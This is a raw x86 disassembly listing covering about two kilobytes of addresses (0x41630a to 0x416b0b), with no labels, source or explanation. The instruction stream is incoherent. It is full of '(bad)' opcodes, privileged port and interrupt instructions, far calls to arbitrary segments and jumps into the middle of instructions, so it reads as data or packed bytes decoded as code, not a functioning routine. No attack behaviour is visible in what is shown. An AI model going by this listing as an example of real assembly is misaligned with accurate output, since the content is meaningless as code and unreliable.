  41630a:	add    ch,BYTE PTR es:[edx+0x22]
  41630e:	xchg   ebp,eax
  41630f:	leave  
  416310:	sub    al,0x5a
  416312:	scas   al,BYTE PTR es:[edi]
  416313:	jae    0x416351
  416315:	sub    DWORD PTR [esi+0x6ae89dfa],esi
  41631b:	js     0x416313
  41631d:	xor    al,0x96
  41631f:	cli    
  416320:	pop    esp
  416321:	pop    ebx
  416322:	outs   dx,BYTE PTR ds:[esi]
  416323:	pop    ss
  416324:	mov    ecx,ecx
  416326:	pop    esi
  416327:	push   0xffffffe0
  416329:	push   esp
  41632a:	add    al,BYTE PTR [edx+0x586446e4]
  416330:	or     al,0xb
  416332:	sub    ebx,DWORD PTR [edi+ebx*8-0x445cd366]
  416339:	mov    cs,WORD PTR [ebx+esi*2+0x1576f66a]
  416340:	shl    DWORD PTR [ebp+0x23],cl
  416343:	cmp    ebp,edx
  416345:	push   esi
  416346:	lahf   
  416347:	fsub   DWORD PTR [ecx-0x557c109e]
  41634d:	pop    ss
  41634e:	icebp  
  41634f:	xchg   edi,eax
  416350:	dec    ecx
  416351:	into   
  416352:	xor    BYTE PTR [edi-0xe],0xb8
  416356:	xor    eax,0xca79ab1
  41635b:	push   ebp
  41635c:	inc    ecx
  41635d:	cli    
  41635e:	mov    bl,0x21
  416360:	mov    edx,eax
  416362:	dec    edi
  416363:	repnz mov ecx,0xb33501db
  416369:	mov    ebp,0xc14d2318
  41636e:	xlat   BYTE PTR ds:[ebx]
  41636f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416370:	std    
  416371:	sbb    al,0xcb
  416373:	mov    bl,ah
  416375:	adc    ah,BYTE PTR [edi]
  416377:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416378:	shl    BYTE PTR [ecx+0xe],0xf2
  41637c:	cmc    
  41637d:	inc    ebp
  41637e:	dec    eax
  41637f:	fwait
  416380:	int    0x7c
  416382:	add    DWORD PTR [edi+ebp*2],ebx
  416385:	xchg   edx,eax
  416386:	push   es
  416387:	pop    edi
  416388:	cmc    
  416389:	sub    DWORD PTR ds:0xf8b99855,eax
  41638f:	mov    eax,ds:0xd72a322a
  416394:	std    
  416395:	psadbw mm5,QWORD PTR [ebp+ebp*2+0x4ab172e]
  41639d:	mov    bh,BYTE PTR [ebp-0x2]
  4163a0:	and    dl,ch
  4163a2:	jnp    0x4163e4
  4163a4:	jge    0x416393
  4163a6:	cmp    esi,eax
  4163a8:	lea    edi,ds:0x5bb20581
  4163ae:	lods   al,BYTE PTR ds:[esi]
  4163af:	call   0x81ab35f9
  4163b4:	loopne 0x41637b
  4163b6:	sbb    ecx,DWORD PTR [ebp+eax*4-0x6f]
  4163ba:	stos   DWORD PTR es:[edi],eax
  4163bb:	and    al,0x57
  4163bd:	xchg   ebx,eax
  4163be:	sbb    eax,0xabe92d44
  4163c3:	or     bl,ch
  4163c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163c6:	loopne 0x416374
  4163c8:	sbb    dh,BYTE PTR [esp+eiz*8]
  4163cb:	or     BYTE PTR [edi-0x2a],cl
  4163ce:	mov    edx,0xf5a245e3
  4163d3:	icebp  
  4163d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163d5:	cmp    ah,BYTE PTR [ecx+0x38]
  4163d8:	mov    al,0x2b
  4163da:	jbe    0x41644b
  4163dc:	repz dec esp
  4163de:	outs   dx,BYTE PTR ds:[esi]
  4163df:	mov    bl,0xfa
  4163e1:	lea    ecx,[edi+0x5cff1fbb]
  4163e7:	scas   al,BYTE PTR es:[edi]
  4163e8:	sti    
  4163e9:	mov    bh,0x38
  4163eb:	jo     0x416467
  4163ed:	mul    BYTE PTR [edi+0x2cadc76b]
  4163f3:	cli    
  4163f4:	mov    ds:0x5140ee3f,eax
  4163f9:	mov    ch,0xdc
  4163fb:	fistp  DWORD PTR [ecx*8+0x2c22337b]
  416402:	dec    edx
  416403:	xor    al,0xb5
  416405:	xor    ebp,DWORD PTR [ebp+0x6c193b3f]
  41640b:	std    
  41640c:	dec    esi
  41640d:	jle    0x416391
  41640f:	adc    edx,edi
  416411:	repnz arpl dx,dx
  416414:	scas   eax,DWORD PTR es:[edi]
  416415:	lock outs dx,DWORD PTR ds:[esi]
  416417:	mov    ah,0x64
  416419:	into   
  41641a:	jns    0x416494
  41641c:	sbb    eax,0xab6cd220
  416421:	enter  0xafd6,0xb1
  416425:	pop    ecx
  416426:	jp     0x4163ad
  416428:	lds    ebx,FWORD PTR [esi]
  41642a:	push   0x5498caa7
  41642f:	mov    eax,0x94bcced7
  416434:	jo     0x41641d
  416436:	out    0xec,al
  416438:	fbstp  TBYTE PTR [edx+0x48]
  41643b:	(bad)  
  41643c:	xor    ecx,ebx
  41643e:	dec    esp
  41643f:	jle    0x4164c0
  416441:	std    
  416442:	push   es
  416443:	push   esp
  416444:	jecxz  0x4163d2
  416446:	jg     0x4164a1
  416448:	xchg   ebp,eax
  416449:	xchg   esp,eax
  41644a:	sahf   
  41644b:	jne    0x4163e5
  41644d:	pop    ss
  41644e:	imul   edx,DWORD PTR [ebx-0x3c],0xffffffe6
  416452:	leave  
  416453:	in     eax,dx
  416454:	dec    edx
  416455:	inc    eax
  416456:	mov    ebp,0xd1434e2b
  41645b:	ss sbb eax,0x679ec68b
  416461:	sbb    esp,esi
  416463:	icebp  
  416464:	push   esi
  416465:	jmp    0x834e:0xd18765a2
  41646c:	inc    esp
  41646d:	(bad)  
  41646e:	mov    esi,DWORD PTR [ebx+eax*1-0x63695585]
  416475:	pop    ecx
  416476:	cmp    esi,DWORD PTR [edi]
  416478:	inc    ecx
  416479:	aad    0x38
  41647b:	shl    DWORD PTR [edx],cl
  41647d:	scas   eax,DWORD PTR es:[edi]
  41647e:	les    edi,FWORD PTR [ebx]
  416480:	inc    eax
  416481:	es ds dec edi
  416484:	ja     0x416449
  416486:	and    DWORD PTR [ebx-0x51],esi
  416489:	dec    esi
  41648a:	mov    dl,0x6b
  41648c:	sbb    ebx,DWORD PTR [edx-0x37]
  41648f:	pop    esi
  416490:	js     0x416422
  416492:	into   
  416493:	test   eax,0x771114f0
  416498:	inc    eax
  416499:	icebp  
  41649a:	jns    0x4164d5
  41649c:	not    DWORD PTR [ebp-0x7e1c99a4]
  4164a2:	dec    ebx
  4164a3:	cld    
  4164a4:	mov    al,ds:0x3f98056f
  4164a9:	ja     0x41644a
  4164ab:	add    ah,BYTE PTR [eax]
  4164ad:	(bad)  
  4164ae:	dec    ebp
  4164af:	pop    edi
  4164b0:	in     eax,0x14
  4164b2:	add    bh,BYTE PTR [ebx-0x97dac91]
  4164b8:	stc    
  4164b9:	xchg   esp,eax
  4164ba:	cwde   
  4164bb:	mov    dh,0x57
  4164bd:	ror    BYTE PTR [eax+edx*4+0x3f],cl
  4164c1:	sub    al,0x5c
  4164c3:	sub    DWORD PTR [edx],esp
  4164c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164c6:	xor    DWORD PTR [ecx+0x49],edx
  4164c9:	sbb    eax,0xe1e6084d
  4164ce:	test   al,0xd2
  4164d0:	sub    ecx,DWORD PTR [edx+0x769a894f]
  4164d6:	jns    0x416478
  4164d8:	inc    esp
  4164d9:	and    ebx,DWORD PTR [ebx-0x46196828]
  4164df:	xchg   DWORD PTR [ecx+0x44],edi
  4164e2:	xchg   BYTE PTR [esi+0x11e99a6],bl
  4164e8:	mov    bh,0x3
  4164ea:	mov    esp,eax
  4164ec:	add    eax,0x9fa32706
  4164f1:	pop    edx
  4164f2:	push   0xeab8c132
  4164f7:	push   ebx
  4164f8:	mov    ch,0x7e
  4164fa:	pop    esi
  4164fb:	fisubr DWORD PTR [edi+0x40c98129]
  416501:	jecxz  0x4164ff
  416503:	or     ecx,DWORD PTR [eax-0x45bdbd64]
  416509:	(bad)  [edi-0x10327969]
  41650f:	sbb    esi,eax
  416511:	cld    
  416512:	test   DWORD PTR [ecx-0x570fad0f],ebp
  416518:	shl    DWORD PTR [edi],cl
  41651a:	loop   0x41657b
  41651c:	inc    eax
  41651d:	jl     0x41650d
  41651f:	ss ror edi,1
  416522:	lea    ebp,[eax+0x18]
  416525:	dec    ebp
  416526:	or     DWORD PTR [edi+0x7ffa265e],0xffffffc4
  41652d:	xchg   ebx,eax
  41652e:	sbb    ch,BYTE PTR [edi]
  416530:	std    
  416531:	sub    esp,ecx
  416533:	mov    edx,0x23e4b011
  416538:	inc    ecx
  416539:	aam    0xa1
  41653b:	mov    edi,0x7e6a3dd3
  416540:	or     ebp,edx
  416542:	push   esp
  416543:	call   0x81e8f28f
  416548:	push   edi
  416549:	cdq    
  41654a:	xchg   ecx,eax
  41654b:	in     eax,0xf9
  41654d:	cmp    al,0x9f
  41654f:	and    al,0xf6
  416551:	inc    eax
  416552:	sub    al,BYTE PTR [edx-0x79]
  416555:	cmp    edi,DWORD PTR [ebp+edx*1-0x2c]
  416559:	xor    bh,BYTE PTR [ebx+0x620ee840]
  41655f:	adc    DWORD PTR [esp+edi*4-0x7cfbc6d],esi
  416566:	fstp   DWORD PTR [esi]
  416568:	ss add eax,0xd28560bc
  41656e:	mov    DWORD PTR [eax+0xf50fdf4],0x11deafb4
  416578:	(bad)  
  416579:	or     dl,bh
  41657b:	pop    es
  41657c:	mov    dh,0x6c
  41657e:	xlat   BYTE PTR ds:[ebx]
  41657f:	dec    esi
  416580:	test   eax,0x3db6041
  416585:	test   eax,0x62f81baa
  41658a:	add    eax,0xe9f7a4ad
  41658f:	xlat   BYTE PTR ds:[ebx]
  416590:	call   0x708e:0x7503307b
  416597:	gs (bad) 
  416599:	dec    ebp
  41659a:	jne    0x416536
  41659c:	jge    0x416531
  41659e:	in     al,0xec
  4165a0:	ins    BYTE PTR es:[edi],dx
  4165a1:	push   edi
  4165a2:	xchg   ecx,eax
  4165a3:	retf   
  4165a4:	retf   
  4165a5:	dec    ecx
  4165a6:	or     ah,bl
  4165a8:	push   ds
  4165a9:	dec    ebx
  4165aa:	cmp    al,0x74
  4165ac:	mov    dl,0xaa
  4165ae:	cmp    bl,BYTE PTR [ebp+ecx*2-0x4f]
  4165b2:	dec    esp
  4165b3:	call   0x515:0xd77f83b1
  4165ba:	jns    0x4165a3
  4165bc:	ret    0x6729
  4165bf:	fisub  DWORD PTR [ecx-0x33ddcf70]
  4165c5:	inc    ebx
  4165c6:	dec    ebp
  4165c7:	mov    ds:0xe26310e,al
  4165cc:	out    dx,al
  4165cd:	arpl   WORD PTR [ebp+0x4d],ax
  4165d0:	jmp    0x4165d6
  4165d2:	sub    dl,BYTE PTR [edi+0x22682eaa]
  4165d8:	popf   
  4165d9:	mov    BYTE PTR [ecx+0x171fb720],0x6f
  4165e0:	sub    bl,BYTE PTR es:[esi+0x7b61ba10]
  4165e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165e8:	and    al,0xfe
  4165ea:	shl    BYTE PTR [eax+0x3e],0xf8
  4165ee:	jp     0x416598
  4165f0:	jmp    0x416665
  4165f2:	pop    ds
  4165f3:	add    eax,0x9eacf58e
  4165f8:	xlat   BYTE PTR ds:[ebx]
  4165f9:	stc    
  4165fa:	jecxz  0x416615
  4165fc:	mov    edx,0x9a646092
  416601:	mov    WORD PTR [ecx-0x7999ca],?
  416607:	stos   BYTE PTR es:[edi],al
  416608:	jle    0x41663b
  41660a:	fdiv   QWORD PTR [edx]
  41660c:	fbstp  TBYTE PTR [ebx+0x1253755]
  416612:	jge    0x416613
  416614:	fs pop eax
  416616:	scas   eax,DWORD PTR es:[edi]
  416617:	lods   al,BYTE PTR ds:[esi]
  416618:	adc    edx,DWORD PTR [ebx-0x5]
  41661b:	ins    BYTE PTR es:[edi],dx
  41661c:	cld    
  41661d:	add    esp,DWORD PTR [eax-0xd0ceb84]
  416623:	rol    BYTE PTR ds:0x8228ee9e,0xad
  41662a:	jae    0x41666f
  41662c:	jns    0x416601
  41662e:	mov    ds:0xcedc86b0,eax
  416633:	jle    0x416646
  416635:	push   ebp
  416636:	imul   ecx,esi,0x53cbaced
  41663c:	xchg   ecx,eax
  41663d:	xchg   BYTE PTR [eax-0x5a],al
  416640:	pop    ecx
  416641:	les    esi,FWORD PTR [ebx-0x16]
  416644:	pop    ss
  416645:	and    al,0x43
  416647:	cld    
  416648:	dec    esp
  416649:	mov    ss,WORD PTR [esi+0x11]
  41664c:	aad    0x5d
  41664e:	dec    esp
  41664f:	sbb    esp,esi
  416651:	and    al,0xf0
  416653:	pusha  
  416654:	mov    ebp,0xd62f02d0
  416659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41665a:	xor    bl,dl
  41665c:	mov    esi,0x3ab3d444
  416661:	sbb    eax,0xb4c4554e
  416666:	stos   BYTE PTR es:[edi],al
  416667:	das    
  416668:	test   DWORD PTR [esp+eiz*2-0x3b],edi
  41666c:	jne    0x416682
  41666e:	pop    esp
  41666f:	xchg   ebp,eax
  416670:	jnp    0x4166c9
  416672:	sbb    BYTE PTR [edx],0x6b
  416675:	mov    DWORD PTR [ebx],edx
  416677:	adc    DWORD PTR [edi+0x4b],eax
  41667a:	or     DWORD PTR [edx],eax
  41667c:	jp     0x416679
  41667e:	mov    edi,0xa34f63d0
  416683:	jo     0x4166d7
  416685:	xor    DWORD PTR [edi-0x3511eb85],esp
  41668b:	mov    bh,0x4b
  41668d:	pop    ebp
  41668e:	inc    ebx
  41668f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416690:	push   edi
  416691:	test   DWORD PTR [edi-0x3a],edi
  416694:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416695:	pop    ss
  416696:	mov    ch,0x3d
  416698:	mov    edx,0x9c364948
  41669d:	push   edx
  41669e:	xor    al,0x4a
  4166a0:	ret    
  4166a1:	push   0xffffffb7
  4166a3:	cmp    al,0xa2
  4166a5:	repnz adc BYTE PTR [ebx-0x6],dl
  4166a9:	inc    eax
  4166aa:	xchg   edi,eax
  4166ab:	(bad)
  4166ae:	inc    esi
  4166af:	pushf  
  4166b0:	scas   eax,DWORD PTR es:[edi]
  4166b1:	or     al,0x9f
  4166b3:	jo     0x416730
  4166b5:	mov    dh,0x92
  4166b7:	call   0x4e6:0xdb770c97
  4166be:	xchg   ecx,eax
  4166bf:	adc    al,BYTE PTR [ebx-0x71878ead]
  4166c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166c6:	fisttp QWORD PTR [ebp+edi*4-0x36]
  4166ca:	call   0x6618:0x25556dbf
  4166d1:	pop    ds
  4166d2:	(bad)  
  4166d3:	and    BYTE PTR [edi],ah
  4166d5:	dec    edx
  4166d6:	and    eax,DWORD PTR [ecx-0x3c5c9447]
  4166dc:	call   0x28d8:0x7e8f65fb
  4166e3:	mov    bl,0x98
  4166e5:	and    al,0x39
  4166e7:	bound  esp,QWORD PTR [edi-0x6c]
  4166ea:	enter  0xc72c,0x14
  4166ee:	jmp    0x416703
  4166f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166f1:	inc    ebx
  4166f2:	mov    edi,0xb4d699c9
  4166f7:	bound  esi,QWORD PTR [ebx]
  4166f9:	xor    al,0xee
  4166fb:	ret    0x64ec
  4166fe:	jae    0x416714
  416700:	and    DWORD PTR [ebp-0x7d],edi
  416703:	dec    esp
  416704:	inc    edx
  416705:	sub    edi,DWORD PTR [esp+edx*2+0x39]
  416709:	and    eax,0xf1b927b8
  41670e:	push   ss
  41670f:	push   edx
  416710:	xchg   ecx,eax
  416711:	cld    
  416712:	repnz inc bl
  416715:	repz fs mov cl,al
  416719:	sbb    esi,DWORD PTR [eax+0x3a95f29]
  41671f:	fldenv [edx+0x3e68b7f0]
  416725:	outs   dx,DWORD PTR ds:[esi]
  416726:	sahf   
  416727:	outs   dx,DWORD PTR ds:[esi]
  416728:	cli    
  416729:	dec    esp
  41672a:	fisubr DWORD PTR [esi]
  41672c:	mov    eax,ds:0x1da390ed
  416731:	ins    BYTE PTR es:[edi],dx
  416732:	(bad)  
  416734:	add    esi,DWORD PTR [edi]
  416736:	push   ds
  416737:	retf   0xb00c
  41673a:	mov    ecx,0xa7f486c
  41673f:	sbb    esp,DWORD PTR [eax]
  416741:	stos   BYTE PTR es:[edi],al
  416742:	js     0x4166ca
  416744:	sbb    al,0x39
  416746:	xchg   ecx,ebx
  416748:	sbb    bh,al
  41674a:	out    0x45,eax
  41674c:	iret   
  41674d:	add    BYTE PTR [edi+0x55dfbfa0],cl
  416753:	popf   
  416754:	mov    eax,ds:0x410df83f
  416759:	xchg   ecx,eax
  41675a:	push   eax
  41675b:	mul    BYTE PTR [eax-0x5d]
  41675e:	sahf   
  41675f:	jo     0x4167ca
  416761:	mov    ah,0x68
  416763:	xor    DWORD PTR [eax-0x4d],ebx
  416766:	out    dx,eax
  416767:	and    eax,0x4d61101c
  41676c:	lods   eax,DWORD PTR ds:[esi]
  41676d:	jno    0x416755
  41676f:	sub    al,0xc3
  416771:	mov    ds:0xbb229878,eax
  416776:	and    eax,0xadf299b8
  41677b:	mov    ecx,0xee95673d
  416780:	mov    eax,ds:0xb77cd410
  416785:	nop
  416786:	dec    esi
  416787:	shr    BYTE PTR [edi+0x7d],0xf4
  41678b:	jmp    0x5c4f:0x9997b344
  416792:	dec    ebp
  416793:	jg     0x416741
  416795:	out    dx,eax
  416796:	jns    0x416787
  416798:	in     eax,dx
  416799:	add    dl,BYTE PTR [ecx]
  41679b:	cmp    al,dh
  41679d:	rol    BYTE PTR [edx+esi*8-0x1d443f16],0xe4
  4167a5:	jle    0x41677a
  4167a7:	push   cs
  4167a8:	scas   al,BYTE PTR es:[edi]
  4167a9:	xor    dl,BYTE PTR [edi+0x3d52d51]
  4167af:	inc    esp
  4167b0:	repz in al,dx
  4167b2:	cld    
  4167b3:	pop    es
  4167b4:	xor    bh,dh
  4167b6:	sbb    esp,DWORD PTR [ebx+0x2d767e4b]
  4167bc:	pushf  
  4167bd:	sahf   
  4167be:	sbb    eax,ecx
  4167c0:	cmp    bh,BYTE PTR [ecx+0x5b]
  4167c3:	mov    DWORD PTR [esi-0x328258cb],eax
  4167c9:	test   al,0xed
  4167cb:	cwde   
  4167cc:	mov    eax,0xccfe9fcb
  4167d1:	mov    eax,DWORD PTR [esi-0x6ec74baf]
  4167d7:	lds    eax,FWORD PTR [edx+ecx*4-0x795dfd76]
  4167de:	push   ss
  4167df:	dec    edx
  4167e0:	shr    BYTE PTR [eax],cl
  4167e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167e3:	inc    esi
  4167e4:	and    eax,0xb86bb37b
  4167e9:	sahf   
  4167ea:	stos   DWORD PTR es:[edi],eax
  4167eb:	std    
  4167ec:	xor    al,0x1c
  4167ee:	add    DWORD PTR [ecx-0x1485f53],0x3c09c228
  4167f8:	addr16 jne 0x416810
  4167fb:	xor    eax,0x307a8d8d
  416800:	paddusw mm7,mm2
  416803:	jo     0x4167e9
  416805:	bound  edi,QWORD PTR [edx+0x66]
  416808:	and    dh,BYTE PTR [ecx+0x28f9cc00]
  41680e:	pop    es
  41680f:	shr    BYTE PTR [edi+0x17],0xfa
  416813:	jg     0x4167c8
  416815:	jl     0x41681d
  416817:	sar    DWORD PTR [eax-0x1854e874],0x16
  41681e:	sbb    esi,DWORD PTR [eax+0x4455bf09]
  416824:	out    dx,eax
  416825:	idiv   DWORD PTR [ebx*4+0x8644593]
  41682c:	(bad)  
  41682d:	adc    cl,dh
  41682f:	ja     0x4167e5
  416831:	mov    edx,0xfdced5d8
  416836:	mov    ds:0x9a55eef4,eax
  41683b:	jmp    0xf87:0x235b14d8
  416842:	shl    DWORD PTR [edx-0x7a08ae18],cl
  416848:	adc    DWORD PTR [edx-0x56],0x5b
  41684c:	mov    al,ds:0x6cf6733d
  416851:	scas   eax,DWORD PTR es:[edi]
  416852:	nop
  416853:	test   DWORD PTR [eax],0x498d4b9e
  416859:	jbe    0x416813
  41685b:	cmp    cl,0x18
  41685e:	out    dx,eax
  41685f:	cmp    dl,al
  416861:	mov    ds:0xbafc5f73,al
  416866:	add    BYTE PTR [ecx+0xcaf41e7],bh
  41686c:	outs   dx,DWORD PTR ds:[esi]
  41686d:	cmp    ah,ch
  41686f:	or     esi,edx
  416871:	shr    BYTE PTR [edx+ebx*2-0x70dc6fef],1
  416878:	enter  0x112c,0x97
  41687c:	ins    BYTE PTR es:[di],dx
  41687e:	js     0x416859
  416880:	cdq    
  416881:	es sahf 
  416883:	cs (bad) 
  416885:	rcl    dl,cl
  416887:	mov    cl,0x4a
  416889:	test   esi,ecx
  41688b:	sbb    eax,0xeb06926
  416890:	aaa    
  416891:	sbb    cl,BYTE PTR [ebx-0x4e]
  416894:	xchg   esi,eax
  416895:	inc    esi
  416896:	pop    ss
  416897:	loopne 0x41684e
  416899:	cdq    
  41689a:	stos   BYTE PTR es:[di],al
  41689c:	or     DWORD PTR [eax+eax*8-0x28e9d7],ecx
  4168a3:	mov    ebp,0x80b4e5c2
  4168a8:	adc    dl,BYTE PTR [ecx+eiz*1+0x2e716d68]
  4168af:	call   0xd636b00b
  4168b4:	out    0x66,eax
  4168b6:	mov    ah,0x8f
  4168b8:	retf   
  4168b9:	adc    eax,0xffffffb0
  4168bc:	jle    0x4168a4
  4168be:	popf   
  4168bf:	mov    cl,0x18
  4168c1:	sbb    ch,al
  4168c3:	ins    BYTE PTR es:[edi],dx
  4168c4:	sbb    esp,DWORD PTR [esp+esi*2-0x1655d2e5]
  4168cb:	sbb    dl,BYTE PTR [ecx-0x5d]
  4168ce:	fmulp  st(4),st
  4168d0:	adc    eax,0xf182b73b
  4168d5:	inc    edi
  4168d6:	les    ecx,FWORD PTR [esi+0x7814e4e8]
  4168dc:	add    ecx,DWORD PTR [ecx+0x5b]
  4168df:	cli    
  4168e0:	jbe    0x4168ad
  4168e2:	xchg   ecx,eax
  4168e3:	and    ch,BYTE PTR [ebx-0x80]
  4168e6:	loop   0x416900
  4168e8:	fistp  QWORD PTR [eax-0x7b]
  4168eb:	aas    
  4168ec:	ret    
  4168ed:	test   DWORD PTR [eax-0x42eb77fe],ebp
  4168f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168f4:	dec    esi
  4168f5:	imul   ebp,ebp,0x48b4834c
  4168fb:	retf   0x803d
  4168fe:	(bad)  
  4168ff:	scas   eax,DWORD PTR es:[edi]
  416900:	xchg   edx,ebx
  416902:	test   BYTE PTR [edx+eax*2-0x25],ah
  416906:	adc    eax,0x81370efd
  41690b:	ror    BYTE PTR [ebp-0x6823d35b],1
  416911:	xchg   esp,eax
  416912:	mov    cl,0xd2
  416914:	add    al,0x9e
  416916:	xor    eax,0x4c5894d
  41691b:	pop    ebx
  41691c:	fsubp  st(6),st
  41691e:	add    eax,0x12ca641d
  416923:	call   0x1361:0xc76ed8ca
  41692a:	add    eax,0x3956f98b
  41692f:	scas   eax,DWORD PTR es:[edi]
  416930:	scas   eax,DWORD PTR es:[edi]
  416931:	imul   esi,DWORD PTR [edx+0x62db9e83],0x82c571ba
  41693b:	and    al,0x2f
  41693d:	fs into 
  41693f:	push   ds
  416940:	js     0x4169ba
  416942:	adc    ecx,DWORD PTR [esi+0x58658258]
  416948:	out    0xbc,al
  41694a:	xor    ebx,ebp
  41694c:	call   0x3226ff98
  416951:	retf   
  416952:	lahf   
  416953:	cdq    
  416954:	es xchg esp,eax
  416956:	fldenv [edi-0x28161fbe]
  41695c:	or     bl,BYTE PTR [ebx+0x3a]
  41695f:	xor    dl,BYTE PTR [ebx-0x35f8315a]
  416965:	mov    edx,0xf208743c
  41696a:	jb     0x41696a
  41696c:	ins    BYTE PTR es:[edi],dx
  41696d:	cmp    al,0x53
  41696f:	jp     0x4169b9
  416971:	sub    BYTE PTR [eax],dh
  416973:	jne    0x41692b
  416975:	xor    BYTE PTR ds:0xb07ebc04,ch
  41697b:	xchg   edi,eax
  41697c:	cwde   
  41697d:	ret    
  41697e:	jae    0x416912
  416980:	pop    edi
  416981:	loope  0x41695d
  416983:	cmp    BYTE PTR [edx],bl
  416985:	dec    esp
  416986:	inc    esp
  416987:	sub    dh,ch
  416989:	jae    0x4169fc
  41698b:	add    dh,dl
  41698d:	je     0x4169ea
  41698f:	dec    edi
  416990:	popa   
  416991:	inc    eax
  416992:	inc    eax
  416993:	test   al,0xaa
  416995:	fstp   st(2)
  416997:	repz fldln2 
  41699a:	push   ebx
  41699b:	fcmovb st,st(2)
  41699d:	push   0x5b
  41699f:	(bad)  
  4169a0:	and    ah,bh
  4169a2:	repnz aad 0x3b
  4169a5:	(bad)
  4169a8:	jne    0x41693c
  4169aa:	xor    al,0x4c
  4169ac:	jae    0x41692e
  4169ae:	out    dx,al
  4169af:	data16 xlat BYTE PTR ds:[ebx]
  4169b1:	sar    ecx,cl
  4169b3:	(bad)  
  4169b4:	jmp    0x416a1b
  4169b6:	push   ecx
  4169b7:	pop    edx
  4169b8:	or     al,0xae
  4169ba:	sbb    cl,BYTE PTR [ebx+0x6fec4ec2]
  4169c0:	add    al,0xfa
  4169c2:	imul   ebx,DWORD PTR [bx+si+0x1c],0x720b5a53
  4169ca:	or     bl,BYTE PTR [eax-0x38]
  4169cd:	jne    0x4169c1
  4169cf:	cld    
  4169d0:	ja     0x416a24
  4169d2:	push   esi
  4169d3:	pop    ss
  4169d4:	enter  0x57f8,0xef
  4169d8:	dec    ebx
  4169d9:	push   ds
  4169da:	and    eax,0xb81d9092
  4169df:	jbe    0x416997
  4169e1:	loope  0x416a30
  4169e3:	sbb    edx,esp
  4169e5:	mov    bl,0x86
  4169e7:	dec    ebx
  4169e8:	fdiv   DWORD PTR [esi-0x39]
  4169eb:	les    edi,FWORD PTR [eax-0x252b1fdc]
  4169f1:	dec    ebx
  4169f2:	sub    eax,0x698bd949
  4169f7:	dec    edi
  4169f8:	sbb    DWORD PTR [ebp-0x7a906645],ebp
  4169fe:	icebp  
  4169ff:	stos   BYTE PTR es:[edi],al
  416a00:	bound  eax,QWORD PTR [ecx+edx*2+0x6701b3da]
  416a07:	adc    dh,BYTE PTR [ebp+0x1]
  416a0a:	dec    ecx
  416a0b:	shl    ch,cl
  416a0d:	clc    
  416a0e:	push   cs
  416a0f:	mov    ds:0x367594b3,eax
  416a14:	xchg   esp,eax
  416a15:	add    al,0x29
  416a17:	out    dx,al
  416a18:	xchg   esi,eax
  416a19:	mov    ah,0xf0
  416a1b:	jp     0x416a68
  416a1d:	push   ss
  416a1e:	mov    ?,WORD PTR [esi]
  416a20:	outs   dx,DWORD PTR ds:[esi]
  416a21:	retf   
  416a22:	fisttp DWORD PTR cs:[ebx+0x7c6cc3a1]
  416a29:	dec    esp
  416a2a:	retf   0xb204
  416a2d:	lock sbb ecx,DWORD PTR [ebx-0x21]
  416a31:	xchg   edx,eax
  416a32:	add    eax,0xfd22e6b
  416a37:	mov    eax,ebp
  416a39:	dec    edx
  416a3a:	mov    eax,ds:0x8080239b
  416a3f:	xor    ecx,DWORD PTR ds:0xd7916ad
  416a45:	push   edi
  416a46:	pop    ecx
  416a47:	sbb    DWORD PTR [ecx-0xf],edi
  416a4a:	shl    ebp,cl
  416a4c:	mov    dh,0xd
  416a4e:	shr    BYTE PTR [eax+0x45],cl
  416a51:	fbstp  TBYTE PTR [eax]
  416a53:	pop    ss
  416a54:	dec    edx
  416a55:	jnp    0x4169e2
  416a57:	push   esp
  416a58:	adc    dh,BYTE PTR [ecx+0x76]
  416a5b:	shl    dh,1
  416a5d:	cmp    ebx,esi
  416a5f:	xor    eax,DWORD PTR [ebx+0x61b4a914]
  416a65:	mov    eax,0x1338622c
  416a6a:	lds    ecx,FWORD PTR [esi+0x14bd3f2]
  416a70:	jmp    0x416a07
  416a72:	mov    dh,0xbd
  416a74:	cmp    eax,0x8ded2835
  416a79:	xor    DWORD PTR [eax],0x1355ffe4
  416a7f:	mov    dh,0x43
  416a81:	sti    
  416a82:	jg     0x416a97
  416a84:	xchg   ebp,eax
  416a85:	test   DWORD PTR [ebp-0x1b],0x14ed6689
  416a8c:	push   0x19
  416a8e:	or     eax,0x563af09d
  416a93:	lds    eax,FWORD PTR [esi-0x38]
  416a96:	sahf   
  416a97:	dec    esi
  416a98:	inc    edx
  416a99:	push   ds
  416a9a:	(bad)  
  416a9b:	cmp    ch,al
  416a9d:	ret    
  416a9e:	cmp    eax,0x1ac9748
  416aa3:	sbb    eax,0x1839d82c
  416aa8:	ds mov eax,0x14ef5962
  416aae:	cli    
  416aaf:	dec    esi
  416ab0:	shr    BYTE PTR [esi-0x43],1
  416ab3:	jmp    0x2b5256f0
  416ab8:	clc    
  416ab9:	imul   eax,ebx,0xffffffaf
  416abc:	not    DWORD PTR [ebx+0x4474ce2b]
  416ac2:	or     BYTE PTR [ecx+ecx*1-0x678af77e],bl
  416ac9:	add    al,0x7b
  416acb:	cmp    DWORD PTR [ebp-0x68],0xffffffd8
  416acf:	aad    0x31
  416ad1:	or     al,0xea
  416ad3:	cmp    DWORD PTR [ebp-0x5376c941],0x1d
  416ada:	jo     0x416b0d
  416adc:	dec    edi
  416add:	leave  
  416ade:	mov    ch,0xe8
  416ae0:	jae    0x416b1d
  416ae2:	rol    BYTE PTR [edi+0x583ed5fb],cl
  416ae8:	push   esi
  416ae9:	(bad)  
  416aeb:	cld    
  416aec:	call   0x4e55:0x45a7471
  416af3:	je     0x416af5
  416af5:	sub    bh,BYTE PTR [ecx+eiz*2-0x2e31a6e8]
  416afc:	nop
  416afd:	pop    edx
  416afe:	pop    ebx
  416aff:	sbb    DWORD PTR [eax-0x25],edx
  416b02:	(bad)  
  416b03:	shr    BYTE PTR [edx],1
  416b05:	and    esp,DWORD PTR [esi+0x7a42dc29]
  416b0b:	cli    
